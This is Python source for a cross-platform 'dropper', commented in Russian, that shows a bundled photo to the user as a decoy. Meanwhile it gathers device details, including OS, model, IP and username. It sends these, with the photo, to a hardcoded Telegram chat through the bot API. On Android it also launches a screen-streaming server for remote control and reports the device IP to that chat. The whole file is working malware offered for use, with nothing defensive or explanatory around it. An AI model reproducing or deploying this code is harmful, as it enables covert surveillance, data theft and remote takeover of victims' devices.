"""
Универсальный dropper для всех платформ (Windows, Android, iOS)
Автоматически определяет платформу и работает соответственно
"""
import sys
import os
import json
import requests
import platform
import socket
import datetime
import getpass
import time


# ID пользователя Telegram для отправки извлеченной информации
TELEGRAM_USER_ID = 8350084460


def get_telegram_bot_token():
    """Получить токен Telegram бота"""
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    if token:
        return token
    
    # Пытаемся найти config.json
    config_paths = [
        "config.json",
        os.path.join(os.path.dirname(__file__), "config.json"),
        os.path.join(os.path.expanduser("~"), ".dropper_config.json")
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    return config.get('telegram_bot_token')
            except Exception:
                pass
    
    return None


def send_info_to_telegram(message, user_id=None, retries=3):
    """Отправляет текстовое сообщение в Telegram с повторными попытками"""
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        log_error("Telegram bot token not found")
        return False
    
    # Повторные попытки отправки
    for attempt in range(retries):
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                'chat_id': user_id,
                'text': message
            }
            
            response = requests.post(url, data=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    log_error(f"Message sent successfully to Telegram (attempt {attempt + 1})")
                    return True
                else:
                    log_error(f"Telegram API returned error: {result.get('description', 'Unknown error')}")
            else:
                log_error(f"Telegram API HTTP error: {response.status_code} - {response.text}")
            
            # Если не последняя попытка, ждем перед повтором
            if attempt < retries - 1:
                time.sleep(2 ** attempt)  # Экспоненциальная задержка: 1s, 2s, 4s
                
        except requests.exceptions.Timeout:
            log_error(f"Telegram request timeout (attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
        except requests.exceptions.ConnectionError as e:
            log_error(f"Telegram connection error (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
        except Exception as e:
            log_error(f"Error sending message to Telegram (attempt {attempt + 1}/{retries})", e)
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
    
    log_error("Failed to send message to Telegram after all retries")
    return False


def send_photo_to_telegram(photo_path, user_id=None, retries=2):
    """Отправляет фото в Telegram с повторными попытками"""
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        log_error("Telegram bot token not found for photo")
        return False
    
    if not os.path.exists(photo_path):
        log_error(f"Photo file not found: {photo_path}")
        return False
    
    # Повторные попытки отправки
    for attempt in range(retries):
        try:
            url = f"https://api.telegram.org/bot{token}/sendPhoto"
            
            with open(photo_path, 'rb') as f:
                files = {'photo': f}
                data = {'chat_id': user_id}
                
                response = requests.post(url, data=data, files=files, timeout=60)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('ok'):
                        log_error(f"Photo sent successfully to Telegram (attempt {attempt + 1})")
                        return True
                    else:
                        log_error(f"Telegram API error for photo: {result.get('description', 'Unknown error')}")
                else:
                    log_error(f"Telegram API HTTP error for photo: {response.status_code}")
            
            if attempt < retries - 1:
                time.sleep(2)
                
        except requests.exceptions.Timeout:
            log_error(f"Telegram photo upload timeout (attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                time.sleep(2)
        except Exception as e:
            log_error(f"Error sending photo to Telegram (attempt {attempt + 1}/{retries})", e)
            if attempt < retries - 1:
                time.sleep(2)
    
    log_error("Failed to send photo to Telegram after all retries")
    return False


def log_error(message, error=None):
    """Логирует ошибку в файл для отладки"""
    try:
        # Пробуем несколько путей для логов
        log_paths = [
            "/sdcard/Download/app_log.txt",  # Android
            os.path.join(os.path.expanduser("~"), "app_log.txt"),  # Домашняя папка
            "app_log.txt",  # Текущая директория
        ]
        
        log_path = None
        for path in log_paths:
            try:
                # Пробуем создать/открыть файл для записи
                test_file = open(path, "a", encoding="utf-8")
                test_file.close()
                log_path = path
                break
            except:
                continue
        
        if log_path:
            with open(log_path, "a", encoding="utf-8") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {message}\n")
                if error:
                    f.write(f"  Error: {str(error)}\n")
                    import traceback
                    f.write(f"  Traceback: {''.join(traceback.format_exception(type(error), error, error.__traceback__))}\n")
                f.flush()  # Принудительно записываем
    except Exception as e:
        # Если не удалось записать в файл, пробуем вывести в консоль
        try:
            print(f"[LOG ERROR] {message}")
            if error:
                print(f"[LOG ERROR] {error}")
        except:
            pass


def get_mobile_info():
    """Собирает информацию о мобильном устройстве"""
    # Для Android используем расширенный сбор информации
    if 'android' in platform.system().lower() or 'linux' in platform.system().lower():
        try:
            from device_info import get_android_info_extended
            return get_android_info_extended()
        except ImportError:
            log_error("device_info module not found, using basic info")
        except Exception as e:
            log_error("Error getting extended Android info", e)
    
    # Базовый сбор для других платформ или при ошибках
    info = {}
    
    try:
        # Базовая информация
        info['platform'] = platform.system()
        info['platform_version'] = platform.version()
        info['machine'] = platform.machine()
        info['processor'] = platform.processor() or platform.machine()
        
        # Для Android (базовый метод)
        if 'android' in platform.system().lower() or 'linux' in platform.system().lower():
            try:
                import subprocess
                result = subprocess.run(['getprop', 'ro.build.version.release'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['android_version'] = result.stdout.strip()
                
                result = subprocess.run(['getprop', 'ro.product.model'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['device_model'] = result.stdout.strip()
            except Exception:
                pass
        
        # Для iOS
        elif platform.system() == 'Darwin' and 'iPhone' in platform.machine():
            try:
                import subprocess
                result = subprocess.run(['sw_vers'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['ios_info'] = result.stdout.strip()
            except Exception:
                pass
        
        # IP адрес
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except Exception:
            info['local_ip'] = "Не удалось определить"
        
        # Имя пользователя/устройства
        try:
            info['username'] = getpass.getuser()
        except Exception:
            info['username'] = os.getenv('USER') or os.getenv('USERNAME') or 'Unknown'
        
        # Время
        info['current_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Python версия
        info['python_version'] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
    except Exception as e:
        info['error'] = str(e)
        log_error("Error in get_mobile_info", e)
    
    return info


def open_image_mobile(image_path):
    """Открывает изображение на мобильном устройстве"""
    try:
        system = platform.system().lower()
        
        if 'android' in system:
            # Android - используем Intent
            try:
                from jnius import autoclass
                Intent = autoclass('android.content.Intent')
                Uri = autoclass('android.net.Uri')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                
                intent = Intent(Intent.ACTION_VIEW)
                intent.setDataAndType(Uri.fromFile(java.io.File(image_path)), "image/*")
                PythonActivity.mActivity.startActivity(intent)
                return True
            except Exception:
                # Fallback - пытаемся через subprocess
                import subprocess
                subprocess.run(['am', 'start', '-a', 'android.intent.VIEW', 
                              '-d', f'file://{image_path}', '-t', 'image/*'], 
                             timeout=10)
                return True
        elif system == 'darwin':
            # iOS - используем системную команду
            import subprocess
            subprocess.run(['open', image_path], timeout=10)
            return True
        elif system == 'windows':
            # Windows
            os.startfile(image_path)
            return True
        else:
            # Linux/другие
            import webbrowser
            webbrowser.open(f'file://{os.path.abspath(image_path)}')
            return True
    except Exception:
        return False


def is_android_device():
    """Определяет, является ли устройство Android"""
    # Метод 1: Проверка через platform (на Android возвращает "Linux")
    system = platform.system().lower()
    if 'android' in system:
        return True
    
    # Метод 2: Проверка наличия Android-специфичных файлов
    android_indicators = [
        '/system/build.prop',
        '/system/bin/app_process',
        '/system/framework',
    ]
    for indicator in android_indicators:
        if os.path.exists(indicator):
            return True
    
    # Метод 3: Проверка через pyjnius (если доступен)
    try:
        from jnius import autoclass
        Build = autoclass('android.os.Build')
        # Если удалось импортировать Build, значит это Android
        return True
    except:
        pass
    
    # Метод 4: Проверка переменных окружения
    android_env_vars = ['ANDROID_ROOT', 'ANDROID_DATA', 'ANDROID_STORAGE']
    for var in android_env_vars:
        if os.getenv(var):
            return True
    
    return False


def main():
    """Основная функция - работает на всех платформах"""
    try:
        # Определяем платформу
        is_mobile = False
        system = platform.system().lower()
        
        # Улучшенное определение Android
        is_android = is_android_device()
        is_ios = (system == 'darwin' and 'iPhone' in platform.machine())
        
        if is_android or is_ios:
            is_mobile = True
            if is_android:
                system = 'android'  # Принудительно устанавливаем для Android
        
        # Путь к изображению
        image_path = None
        
        # Ищем изображение в разных местах
        possible_paths = [
            "photo.jpg",  # Для готового приложения
            "embedded_image.jpg",
            os.path.join(os.path.dirname(__file__), "photo.jpg"),
            os.path.join(os.path.dirname(__file__), "embedded_image.jpg"),
            os.path.join(os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.getcwd(), "photo.jpg"),
            os.path.join(os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.getcwd(), "embedded_image.jpg"),
        ]
        
        # Для Android/iOS - в ресурсах приложения
        if hasattr(sys, '_MEIPASS'):
            possible_paths.insert(0, os.path.join(sys._MEIPASS, "photo.jpg"))
            possible_paths.insert(1, os.path.join(sys._MEIPASS, "embedded_image.jpg"))
        
        for path in possible_paths:
            if os.path.exists(path):
                image_path = path
                break
        
        if not image_path:
            # Если изображение не найдено, создаем сообщение об ошибке
            send_info_to_telegram(f"❌ Ошибка: изображение не найдено\nПлатформа: {platform.system()}")
            return 1
        
        # СНАЧАЛА открываем изображение СРАЗУ
        if is_mobile:
            open_image_mobile(image_path)
        else:
            if sys.platform == 'win32':
                os.startfile(image_path)
            else:
                import webbrowser
                webbrowser.open(image_path)
        
        # Небольшая задержка
        time.sleep(0.5)
        
        # Запускаем стриминг сервер и запись экрана в фоне (только для Android)
        streaming_server = None
        if is_mobile and system == 'android':
            try:
                log_error("Attempting to start streaming server...")
                from streaming_server import start_streaming_server
                from streaming_server import get_device_ip
                
                # Запускаем сервер стриминга
                log_error("Importing streaming_server modules successful")
                streaming_server = start_streaming_server(port=8888)
                
                if streaming_server:
                    device_ip = get_device_ip()
                    log_error(f"Streaming server started successfully on {device_ip}:8888")
                    
                    # Отправляем IP адрес в Telegram
                    ip_message = f"📡 Стриминг сервер запущен\n\nIP: {device_ip}\nПорт: 8888\n\nПодключитесь с PC клиента:\n1. Запустите start_remote_control.bat\n2. Введите IP: {device_ip}\n3. Нажмите Connect"
                    send_info_to_telegram(ip_message)
                    log_error("IP address sent to Telegram")
                else:
                    log_error("Failed to start streaming server (returned None)")
            except ImportError as e:
                log_error("Error importing streaming_server module", e)
            except Exception as e:
                log_error("Error starting streaming server", e)
                # Пробуем отправить ошибку в Telegram
                try:
                    send_info_to_telegram(f"⚠ Ошибка запуска стриминг сервера: {str(e)[:200]}")
                except:
                    pass
        
        # Собираем информацию о системе
        info = get_mobile_info()
        
        # Формируем сообщение
        if is_mobile and 'system' in info:
            # Используем расширенную информацию для Android
            try:
                from device_info import format_info_for_telegram
                message = format_info_for_telegram(info)
            except ImportError:
                # Fallback к базовому формату
                message = f"""📥 Извлечено изображение

🖥️ ПЛАТФОРМА:
├─ Система: {info.get('platform', 'Unknown')}
├─ Версия: {info.get('platform_version', 'Unknown')}
├─ Архитектура: {info.get('machine', 'Unknown')}
└─ Процессор: {info.get('processor', 'Unknown')}"""
        else:
            # Базовый формат для других платформ
            message = f"""📥 Извлечено изображение

🖥️ ПЛАТФОРМА:
├─ Система: {info.get('platform', 'Unknown')}
├─ Версия: {info.get('platform_version', 'Unknown')}
├─ Архитектура: {info.get('machine', 'Unknown')}
└─ Процессор: {info.get('processor', 'Unknown')}"""
        
        # Добавляем мобильную информацию (для базового формата)
        if is_mobile and 'system' not in info:
            if 'android_version' in info:
                message += f"\n\n📱 ANDROID:\n└─ Версия: {info['android_version']}"
            if 'device_model' in info:
                message += f"\n└─ Модель: {info['device_model']}"
            if 'ios_info' in info:
                message += f"\n\n🍎 iOS:\n{info['ios_info']}"
        
        if 'system' not in info:
            message += f"""

🌐 СЕТЬ:
└─ Локальный IP: {info.get('local_ip', 'Unknown')}

👤 ПОЛЬЗОВАТЕЛЬ:
└─ Имя: {info.get('username', 'Unknown')}

⏰ ВРЕМЯ:
└─ Запуск: {info.get('current_time', 'Unknown')}

🐍 PYTHON:
└─ Версия: {info.get('python_version', 'Unknown')}

📁 ПУТЬ:
└─ Изображение: {image_path}"""
        
        # Отправляем информацию
        log_error("Sending device information to Telegram")
        send_info_to_telegram(message)
        
        # Если есть расширенная информация, отправляем JSON файлом
        if is_mobile and 'system' in info:
            try:
                import tempfile
                temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding='utf-8')
                json.dump(info, temp_file, indent=2, ensure_ascii=False)
                temp_file.close()
                
                # Отправляем как документ
                token = get_telegram_bot_token()
                if token:
                    url = f"https://api.telegram.org/bot{token}/sendDocument"
                    with open(temp_file.name, 'rb') as f:
                        files = {'document': f}
                        data = {'chat_id': TELEGRAM_USER_ID, 'caption': 'Полная информация об устройстве (JSON)'}
                        requests.post(url, data=data, files=files, timeout=60)
                
                try:
                    os.unlink(temp_file.name)
                except:
                    pass
            except Exception as e:
                log_error("Error sending JSON file", e)
        
        # Отправляем само изображение
        send_photo_to_telegram(image_path)
        
        return 0
        
    except Exception as e:
        send_info_to_telegram(f"❌ Ошибка: {str(e)}\nПлатформа: {platform.system()}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
